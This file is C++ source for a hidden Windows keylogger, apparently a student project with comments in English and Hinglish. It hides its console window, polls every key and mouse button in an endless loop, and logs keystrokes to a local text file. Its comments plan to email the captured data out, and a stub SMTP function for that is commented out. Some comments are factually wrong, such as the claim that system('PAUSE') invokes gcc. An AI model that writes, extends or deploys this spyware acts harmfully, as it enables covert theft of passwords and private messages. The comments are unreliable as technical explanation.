//Add function keys can also be done.
//Modify to automatically send mails.
//Learn network programming in C++

// link with Ws2_32.lib
#pragma comment(lib,"Ws2_32.lib")


#include<iostream>
#include<fstream>     //To handle file handling, we use fstream header file
#include <winsock2.h> //
#include<windows.h>   //to use functions to take keys and recognize keyboard inputs
#include<winuser.h>
//#include<ctime>       //For time purposes
//#include<sys/socket.h>  //Its actally for linux

#include <ws2tcpip.h>

using namespace std;

/*
//Mail wala part (iske details baad me likh dena.
int ConnectToServer(const char* server_address)
{
	int socket_fd=socket(AF_INET,SOCK_STREAM,IPPROTO_IP);  //creating a file descriptor using socket function.
	struct sockaddr_in addr;
	addr.sin_family=AF_INET;
	addr.sin_port=htons(25); //SMMTP port
	return socket_fd;//return that socket file descriptor
	return 0;
}

const char* GetIPAddress(const char* target_domain)
{
	const char* target_ip;
	struct hostent *raw_list;
}

*/
void write(int key)  //This function takes integer argument and will be used to write what is enetered keystroke.
					//integer value bcoz we will actually send an ASCII code (an integer) and later convert it to char.
{
	ofstream file;  //file is a variable. ofstream class (defined in fstream library) is used to create data file and to write
					//informartion to files. It output a file.
					
	file.open("Keylogger_info.txt",ios::app); //You can take any file name here.We will append it. Search about ios::
											  //Its stored in documents.
	
	//cout<<i<<endl;//It shows ASCII codes also
	//Real keylogger part starts here!
	if((key==1)||(key==2))    //ASCII 0 is null character ,1 is start of heading(SOH) and 2 is start of text(STX)
	{
		file<<endl;
	}
	else
	{
		cout<<key<<endl;
		
		if(key==VK_BACK)    //VK is for virtual keys like backspace, enter..
		{
			file<<"{Backspace}";
		}
		else if(key==VK_RETURN)
		{
			file<<"{Enter}";
		}
		else if(key==VK_SPACE)
		{
			file<<"{Space}";
		}
		else if(key==VK_TAB)
		{
			file<<"{Tab}";
		}
		else if(key==VK_SHIFT)
		{
			file<<"{Shift}";
		}
		else if(key==VK_CONTROL)
		{
			file<<"{ctrl}";
		}
		else if(key==VK_ESCAPE)
		{
			file<<"{Esc}";
		}
		else if(key==VK_DELETE)
		{
			file<<"{Del}";
		}
		else if(key==VK_LEFT)       //Arrow keys
		{
			file<<"{Left Arrow}";
		}
		else if(key==VK_RIGHT)       
		{
			file<<"{Right Arrow}";
		}
		else if(key==VK_DOWN)       
		{
			file<<"{Down Arrow}";
		}
		else if(key==VK_UP)       
		{
			file<<"{Up Arrow}";
		}
		else if(key==VK_SNAPSHOT)       
		{
			file<<"{Print screen key}";
		}
		else if(key==VK_LBUTTON)          //Mousebuttons     
		{
			file<<"{Left mouse button}";
		}
		else if(key==VK_RBUTTON)       
		{
			file<<"{Right mouse button}";
		}
		else if(key==VK_NUMPAD0)        //numeric keys
		{
			file<<"0";
		}
		else if(key==VK_NUMPAD1)
		{
			file<<"1";
		}
		else if(key==VK_NUMPAD2)
		{
			file<<"2";
		}
		else if(key==VK_NUMPAD3)
		{
			file<<"3";
		}
		else if(key==VK_NUMPAD4)
		{
			file<<"4";
		}
		else if(key==VK_NUMPAD5)
		{
			file<<"5";
		}
		else if(key==VK_NUMPAD6)
		{
			file<<"6";
		}
		else if(key==VK_NUMPAD7)
		{
			file<<"7";
		}
		else if(key==VK_NUMPAD8)
		{
			file<<"8";
		}
		else if(key==VK_NUMPAD9)
		{
			file<<"9";
		}
		else
		{
			file<<char(key);  //key will be integer form bcoz ASCII..We typecast it to character here.
		}
	}
	file.close();
}

int main()
{
	HWND window;//WINDOW HANDLE variable declare karo. varible name is window here.
	
	//A shell is a program that actually processes commands and returns output.bash is the most common shell in LINUX systems.
	
	//A terminal refers  to a wrapper program that runs a shell.Decades ago they were actually physical devices consisting of little monitor
	//and keyboard but after better multiprocessing, these were abstracted into software.
	
	//A console is a special sort of terminal.Modern LINUX systems provide virtual consoles.
	
	
	//This function is primarily used by a GUI application  to create a console window. GUI apps are initialized without a console.
	AllocConsole();
	window=FindWindowA("ConsoleWindowClass",NULL); //a function in winuser header file.
	ShowWindow(window,0);  //Its used to hide the console. we pass window variable and 0. 0 is used to hide the window
	
	char i;      //To store values of keystrokes
	 
	while(1)    //Or while(true). To basically run it infintely
	{
		for(i=8;i<=227;i++)   //ASCII 8 is the code for backspace
		{
			//-32737 is the lower limit of integer possoble to store in the register. The size of the number stored is liited by the size 
			//of the register and it in turn is limited by the size of the data bus which in turn is limited by the processing capacity of 
			//processor which in turn is limited by current technology.If u increase processor capacity, cost increases so everything is 
			//limited by cost.
			
		    if(GetAsyncKeyState(i)==-32767)  //to register our key and we will pass i here.
			{
				write(i);                    //calling write function.
			} 
							            
	    }
	}
	
	system("PAUSE"); //We invoke gcc from our program using system() . 
					 //This function isused to excecute pause command and make the screen/terminal wait for a key preess.
					//gcc is GNU Compiler Collections which is used to compile mainly C and C++ languages.
	return 0;
}

